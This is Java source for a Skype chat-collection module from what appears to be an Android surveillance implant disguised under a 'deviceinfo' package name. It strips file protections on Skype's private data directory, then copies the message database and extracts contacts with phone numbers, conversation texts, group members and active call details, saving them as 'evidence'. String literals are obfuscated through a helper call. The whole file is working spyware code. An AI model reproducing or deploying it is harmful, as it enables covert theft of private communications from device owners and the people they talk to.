package com.android.deviceinfo.module.chat;

import java.io.File;
import java.io.IOException;
import java.util.ArrayList;
import java.util.Date;
import java.util.Hashtable;
import java.util.List;
import java.util.concurrent.Semaphore;

import javax.xml.parsers.DocumentBuilder;
import javax.xml.parsers.DocumentBuilderFactory;

import org.w3c.dom.Document;
import org.w3c.dom.Node;
import org.w3c.dom.NodeList;

import android.database.Cursor;

import com.android.deviceinfo.auto.Cfg;
import com.android.deviceinfo.db.GenericSqliteHelper;
import com.android.deviceinfo.db.RecordVisitor;
import com.android.deviceinfo.file.Path;
import com.android.deviceinfo.manager.ManagerModule;

import com.android.deviceinfo.module.ModuleAddressBook;
import com.android.deviceinfo.module.call.CallInfo;
import com.android.deviceinfo.util.Check;
import com.android.deviceinfo.util.StringUtils;
import com.android.m.M;

public class ChatSkype extends SubModuleChat {
	private static final String TAG = "ChatSkype";

	private static final int PROGRAM = 0x01;
	String pObserving = M.e("com.skype");

	private Date lastTimestamp;

	private Hashtable<String, Long> lastSkype;
	Semaphore readChatSemaphore = new Semaphore(1, true);

	ChatGroups groups = new ChatSkypeGroups();

	public static String dbDir = M.e("/data/data/com.skype.raider/files");

	@Override
	public int getProgramId() {
		return PROGRAM;
	}

	@Override
	String getObservingProgram() {
		return pObserving;
	}

	@Override
	void notifyStopProgram(String processName) {
		try {
			readSkypeMessageHistory();
		} catch (IOException e) {
			if (Cfg.DEBUG) {
				Check.log(TAG + " (notifyStopProgram) Error: " + e);
			}
		}
	}

	@Override
	protected void start() {
		lastSkype = markup.unserialize(new Hashtable<String, Long>());
		try {
			readSkypeMessageHistory();
		} catch (IOException e) {
			if (Cfg.DEBUG) {
				Check.log(TAG + " (notifyStopProgram) Error: " + e);
			}
		}

		if (Cfg.DEBUG) {
			Check.log(TAG + " (start), read lastSkype: " + lastSkype);
		}
	}

	@Override
	protected void stop() {
		if (Cfg.DEBUG) {
			Check.log(TAG + " (stop), ");
		}
	}

	private void readSkypeMessageHistory() throws IOException {
		if (Cfg.DEBUG) {
			Check.log(TAG + " (readChatMessages)");
		}

		if (!readChatSemaphore.tryAcquire()) {
			if (Cfg.DEBUG) {
				Check.log(TAG + " (readSkypeMessageHistory), semaphore red");
			}
			return;
		}
		try {
			boolean updateMarkup = false;

			// k_0=/data/data/com.skype.raider/files

			String account = readAccount();

			if (account == null || account.length() == 0)
				return;

			if (Cfg.DEBUG) {
				Check.log(TAG + " (readSkypeMessageHistory) account: " + account);
			}

			GenericSqliteHelper helper = openSkypeDBHelper(account);
			if (helper != null) {
				
				ModuleAddressBook.createEvidenceLocal(ModuleAddressBook.SKYPE, account);
				if (ManagerModule.self().isInstancedAgent(ModuleAddressBook.class)) {
					saveSkypeContacts(helper);
				}

				List<SkypeConversation> conversations = getSkypeConversations(helper, account);
				for (SkypeConversation sc : conversations) {
					String peer = sc.remote;
					if (Cfg.DEBUG) {
						Check.log(TAG + " (readSkypeMessageHistory) conversation: " + peer + " lastReadIndex: "
								+ sc.lastReadIndex);
					}
					groups = new ChatSkypeGroups();

					// retrieves the lastConvId recorded as evidence for this
					// conversation
					long lastConvId = lastSkype.containsKey(account + peer) ? lastSkype.get(account + peer) : 0;

					if (sc.lastReadIndex > lastConvId) {
						if (groups.isGroup(peer) && !groups.hasMemoizedGroup(peer)) {
							fetchGroup(helper, peer);
						}

						int lastReadId = (int) fetchMessages(helper, sc, lastConvId);
						if (lastReadId > 0) {
							updateMarkupSkype(account + peer, lastReadId, true);
						}
					}
				}
				helper.deleteDb();
			} else {
				if (Cfg.DEBUG) {
					Check.log(TAG + " (readSkypeMessageHistory) Error, null helper");
				}
			}
		} finally {
			readChatSemaphore.release();
		}
	}

	public static GenericSqliteHelper openSkypeDBHelper(String account) {
		// k_1=/main.db
		
		if(account.contains(":")){
			String name = account.split(":")[1];
			File fileBaseDir = new File(dbDir);
			File[] files = fileBaseDir.listFiles();
			for ( File f : files) {
				if(f.getName().contains(name)){
					account = f.getName();
					break;
				}
			}
		}
	
		String dbFile = dbDir + "/" + account + M.e("/main.db");
		Path.unprotect(dbDir + "/" + account, true);
		Path.unprotect(dbFile, true);
		Path.unprotect(dbFile + M.e("-journal"), true);

		File file = new File(dbFile);

		GenericSqliteHelper helper = null;
		if (file.canRead()) {
			if (Cfg.DEBUG) {
				Check.log(TAG + " (readSkypeMessageHistory): can read DB");
			}

			helper = GenericSqliteHelper.openCopy(dbFile);
			helper.deleteAtEnd = false;
		}
		
		return helper;
	}

	private void saveSkypeContacts(GenericSqliteHelper helper) {
		String[] projection = new String[] { M.e("id"), M.e("skypename"), M.e("fullname"), M.e("displayname"), M.e("pstnnumber") };

		boolean tosave = false;
		RecordVisitor visitor = new RecordVisitor(projection, M.e("is_permanent=1")) {

			@Override
			public long cursor(Cursor cursor) {

				long id = cursor.getLong(0);
				String skypename = cursor.getString(1);
				String fullname = cursor.getString(2);
				String displayname = cursor.getString(3);

				String phone = cursor.getString(4);

				Contact c = new Contact(Long.toString(id), phone, skypename, "Display name: " + displayname);

				if (ModuleAddressBook.createEvidenceRemote(ModuleAddressBook.SKYPE, c)) {
					if (Cfg.DEBUG) {
						Check.log(TAG + " (cursor) need to serialize");
					}
					return 1;
				}
				return 0;
			}
		};

		if (helper.traverseRecords("Contacts", visitor) == 1) {
			if (Cfg.DEBUG) {
				Check.log(TAG + " (saveSkypeContacts) serialize");
			}
			ModuleAddressBook.getInstance().serializeContacts();
		}
	}

	private List<SkypeConversation> getSkypeConversations(GenericSqliteHelper helper, final String account) {

		final List<SkypeConversation> conversations = new ArrayList<SkypeConversation>();

		String[] projection = new String[] { M.e("id"), M.e("identity"), M.e("displayname"), M.e("given_displayname"), M.e("inbox_message_id") };
		String selection = M.e("inbox_timestamp > 0 and is_permanent=1");

		RecordVisitor visitor = new RecordVisitor(projection, selection) {

			@Override
			public long cursor(Cursor cursor) {
				SkypeConversation c = new SkypeConversation();
				c.account = account;
				c.id = cursor.getInt(0);
				c.remote = cursor.getString(1);
				c.displayname = cursor.getString(2);
				c.given = cursor.getString(3);
				c.lastReadIndex = cursor.getInt(4);

				conversations.add(c);
				return c.id;
			}
		};

		helper.traverseRecords("Conversations", visitor);
		return conversations;
	}

	private long fetchMessages(GenericSqliteHelper helper, final SkypeConversation conversation, long lastConvId) {

		// select author, body_xml from Messages where convo_id == 118 and id >=
		// 101 and body_xml != ''

		try {
			final ArrayList<MessageChat> messages = new ArrayList<MessageChat>();

			String[] projection = new String[] { M.e("id"), M.e("author"), M.e("body_xml"), M.e("timestamp") };
			String selection = M.e("type == 61 and convo_id = ") + conversation.id + M.e(" and body_xml != '' and id > ")
					+ lastConvId;
			String order = M.e("timestamp");

			RecordVisitor visitor = new RecordVisitor(projection, selection, order) {

				@Override
				public long cursor(Cursor cursor) {
					// I read a line in a conversation.
					int id = cursor.getInt(0);
					String peer = cursor.getString(1);
					String body = cursor.getString(2);
					// localtime or gmt? should be converted to gmt
					long timestamp = cursor.getLong(3);
					Date date = new Date(timestamp * 1000L);

					if (Cfg.DEBUG) {
						Check.log(TAG + " (cursor) sc.account: " + conversation.account + " conv.remote: "
								+ conversation.remote + " peer: " + peer);
					}

					boolean incoming = !(peer.equals(conversation.account));
					boolean isGroup = groups.isGroup(conversation.remote);

					if (Cfg.DEBUG) {
						Check.log(TAG + " (cursor) incoming: " + incoming + " group: " + isGroup);
					}

					String from, to = null;
					String fromDisplay, toDisplay = null;

					from = incoming ? peer : conversation.account;
					fromDisplay = incoming ? conversation.displayname : from;

					if (isGroup) {
						to = groups.getGroupToName(peer, conversation.remote);
						toDisplay = to;
					} else {
						to = incoming ? conversation.account : conversation.remote;
						toDisplay = incoming ? conversation.account : conversation.displayname;
					}

					if (!StringUtils.isEmpty(body)) {
						MessageChat message = new MessageChat(getProgramId(), date, from, fromDisplay, to, toDisplay,
								body, incoming);

						messages.add(message);
					}

					return id;
				}
			};

			// f_a=messages
			// M.d("messages")
			long newLastId = helper.traverseRecords(M.e("messages"), visitor);

			if (messages != null && messages.size() > 0) {
				saveEvidence(messages);
			}

			return newLastId;
		} catch (Exception e) {
			if (Cfg.DEBUG) {
				e.printStackTrace();
				Check.log(TAG + " (fetchMessages) Error: " + e);
			}
			return -1;
		}

	}

	private void fetchGroup(GenericSqliteHelper helper, final String conversation) {

		String[] projection = new String[] { M.e("identity") };
		String selection = M.e("chatname = '") + conversation + "'";

		RecordVisitor visitor = new RecordVisitor(projection, selection) {
			@Override
			public long cursor(Cursor cursor) {
				String remote = cursor.getString(0);
				groups.addPeerToGroup(conversation, remote);
				return 0;
			}
		};

		helper.traverseRecords(M.e("ChatMembers"), visitor);
	}

	public static String readAccount() {

		String confFile = dbDir + M.e("/shared.xml");

		Path.unprotect(confFile, true);

		DocumentBuilder builder;
		String account = null;
		try {
			builder = DocumentBuilderFactory.newInstance().newDocumentBuilder();
			Document doc = builder.parse(new File(confFile));
			NodeList defaults = doc.getElementsByTagName(M.e("Default"));
			for (int i = 0; i < defaults.getLength(); i++) {
				Node d = defaults.item(i);
				Node p = d.getParentNode();
				if (M.e("Account").equals(p.getNodeName())) {
					account = d.getFirstChild().getNodeValue();
					break;
				}
			}

		} catch (Exception e) {
			if (Cfg.DEBUG) {
				Check.log(TAG + " (readAccount) Error: " + e);
			}
		}
		return account;
	}

	private void updateMarkupSkype(String account, long newLastId, boolean serialize) {
		if (Cfg.DEBUG) {
			Check.log(TAG + " (updateMarkupSkype), mailStore: " + account + " +lastId: " + newLastId);
		}

		lastSkype.put(account, newLastId);
		try {
			if (serialize || (newLastId % 10 == 0)) {
				if (Cfg.DEBUG) {
					Check.log(TAG + " (updateMarkupSkype), write lastId: " + newLastId);
				}
				markup.writeMarkupSerializable(lastSkype);
			}
		} catch (IOException e) {
			if (Cfg.DEBUG) {
				Check.log(TAG + " (updateMarkupSkype) Error: " + e);
			}
		}
	}

	public void saveEvidence(ArrayList<MessageChat> messages) {
		getModule().saveEvidence(messages);
	}

	public static boolean getCurrentCall(GenericSqliteHelper helper, final CallInfo callInfo) {
		// select ca.id,identity,dispname,call_duration,cm.type,cm.start_timestamp,is_incoming from callmembers as cm join calls as ca on cm.call_db_id = ca.id order by ca.id desc limit 1
		String sqlQuery= M.e("select ca.id,identity,dispname,call_duration,cm.type,cm.start_timestamp,is_incoming from callmembers as cm join calls as ca on cm.call_db_id = ca.id and is_active = 1 order by ca.id desc limit 1");
		
		RecordVisitor visitor = new RecordVisitor() {

			@Override
			public long cursor(Cursor cursor) {
				callInfo.id = cursor.getInt(0); 
				callInfo.peer = cursor.getString(1);
				callInfo.displayName = cursor.getString(2);
				int type = cursor.getInt(4);
				callInfo.timestamp = new Date(cursor.getLong(5));
				callInfo.incoming = cursor.getInt(6) == 1;
				callInfo.valid = true;
				
				return callInfo.id;
			}
		};

		helper.traverseRawQuery(sqlQuery, new String[]{}, visitor);
		return callInfo.valid;
	}
	
	public class ChatSkypeGroups extends ChatGroups {

		@Override
		boolean isGroup(String peer) {
			
			return peer.startsWith("#");
		}

	}

}
